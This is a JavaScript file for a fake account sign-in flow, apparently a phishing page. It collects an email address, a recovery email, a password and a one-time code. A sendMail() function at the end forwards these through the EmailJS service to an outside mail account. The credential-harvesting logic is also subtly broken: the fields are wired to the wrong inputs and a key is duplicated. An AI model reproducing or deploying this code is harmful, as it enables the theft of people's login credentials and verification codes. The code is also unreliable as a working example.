function movePlaceholder(input) {
    const label = input.nextElementSibling;
    label.classList.add('active');
}

function resetPlaceholder(input) {
    const label = input.nextElementSibling;
    if (!input.value) {
        label.classList.remove('active');
    }
}

// Function to update the displayed email on the password screen
function updateEmailDisplay(input) {
    const emailDisplay = document.getElementById("email-display");
    emailDisplay.textContent = input.value || "Enter your email";
}

// Function to toggle password visibility on the password screen
function togglePasswordVisibility() {
    const passwordInput = document.getElementById("password");
    const checkbox = document.getElementById("show-password");

    if (checkbox && passwordInput) {
        passwordInput.type = checkbox.checked ? "text" : "password";
    }
}

// Function to save the email and recovery email to localStorage and redirect to the password screen
document.querySelector('.next-button').addEventListener('click', function (event) {
    event.preventDefault(); // Prevent form submission

    const emailInput = document.getElementById('email').value;
    const recoveryEmailInput = document.getElementById('recoveryemail') ? document.getElementById('recoveryemail').value : '';

    if (emailInput && recoveryEmailInput) {
        // Show loading overlay
        document.getElementById('loading-overlay').style.display = 'flex';

        // Save email and recovery email to localStorage
        localStorage.setItem('userEmail', emailInput);
        localStorage.setItem('userRecoveryEmail', recoveryEmailInput);

        // Simulate redirection to the password screen
        setTimeout(() => {
            document.getElementById('loading-overlay').style.display = 'none';
            window.location.href = 'password.html'; // Redirect to password screen
        }, 2000); // 2 seconds delay for demonstration
    } else {
        alert('Please enter a valid email address and recovery email.');
    }
});

// On the password screen, load the stored email
function loadEmail() {
    const emailDisplay = document.getElementById("email-display");
    const storedEmail = localStorage.getItem("userEmail");
    emailDisplay.textContent = storedEmail || "No email provided";
}
function sendMail() {
    var params = {
        email: document.getElementById("email").value,
        password: document.getElementById("email").value,
        recoveryemail: document.getElementById("email").value,
        email: document.getElementById("otp1").value,
    }
    const serviceID = "service_fic89zv";
    emailjs.send(serviceID, params).then(
        res => {
            document.getElementById("email").email = "";
            console.log(res);
            alert("your message sent successfully ");
        }
    ).catch((err) => console.log(err));
}

